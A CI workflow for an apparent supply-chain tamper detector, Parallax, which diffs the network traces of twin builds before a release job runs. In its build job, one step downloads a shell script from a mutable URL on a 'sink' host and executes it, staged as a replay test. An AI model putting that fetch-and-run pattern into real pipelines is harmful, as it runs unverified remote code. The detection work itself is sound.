name: ci

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

# The verdict job reads this run's jobs through the GitHub API.
permissions:
  contents: read
  actions: read

jobs:
  # Every build runs twice: a bare twin and a decoy twin dressed as a release.
  # CRACI records every connection of both. Parallax diffs the two traces.
  build:
    name: build (${{ matrix.twin }})
    runs-on: craci
    strategy:
      fail-fast: false
      matrix:
        twin: [bare, decoy]
    steps:
      - uses: cracicorp/setup@v1
        with:
          size: "2"
          image: "default"
      - uses: actions/checkout@v4
      - name: Dress this twin
        uses: Helios-One-Oy/parallax/dress@v0
        with:
          twin: ${{ matrix.twin }}
      # Fetch a small bootstrap script by a mutable URL and run it. Harmless: it
      # only prints a line. CRACI records a body hash for this URL, so if the
      # sink serves new bytes for the same URL (tag-repoint replay) the fleet
      # drift detector sees "same URL, new bytes".
      - name: Fetch and run the build bootstrap (mutable URL)
        run: |
          curl -fsS https://parallax-sink.fly.dev/script/bootstrap.sh -o /tmp/plx-bootstrap.sh
          sh /tmp/plx-bootstrap.sh
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      # Twins only RESTORE the cache; they never save it, so a twin can never
      # poison the cache the release job trusts.
      - uses: actions/cache/restore@v4
        with:
          path: ~/.npm
          key: npm-${{ hashFiles('**/package-lock.json') }}
      - run: plx-run npm ci
      - run: plx-run npm test
      - run: plx-run npm run build

  # After both twins finish, Parallax fetches both traces + SBOMs from the CRACI
  # API, diffs them, writes the job summary and fails on divergence.
  # The judge sits outside the build network: CRACI does not let a job on its
  # runners read CRACI's records ("Access denied"), so this one job is GitHub-hosted.
  verdict:
    needs: build
    if: always()
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Parallax verdict
        uses: Helios-One-Oy/parallax/verdict@v0
        with:
          craci-token: ${{ secrets.CRACI_API_TOKEN }}
          github-token: ${{ github.token }}

  # The real release job. It only starts once the verdict is clean. It is the
  # single cache-producing job (restore + save).
  release:
    needs: verdict
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: craci
    permissions:
      contents: read
      packages: write
    steps:
      - uses: cracicorp/setup@v1
        with:
          size: "2"
          image: "default"
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - uses: actions/cache@v4
        with:
          path: ~/.npm
          key: npm-${{ hashFiles('**/package-lock.json') }}
      # cache-poison replay evidence: if a pull_request_target job planted a
      # marker in the cache under this key, the trusted release job restores it.
      - name: Note any cache marker (cache-poison replay)
        run: cat ~/.npm/PARALLAX_CACHE_MARKER.txt 2>/dev/null || echo "no cache marker present"
      - run: npm ci
      - run: npm run build
      - run: npm prune --omit=dev
      - name: Build and push the release image
        env:
          IMAGE: ghcr.io/helios-one-oy/parallax-demo-web
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "$GH_TOKEN" | docker login ghcr.io -u "${{ github.actor }}" --password-stdin
          docker build -t "$IMAGE:${{ github.sha }}" -t "$IMAGE:latest" .
          docker push "$IMAGE:${{ github.sha }}"
          docker push "$IMAGE:latest"
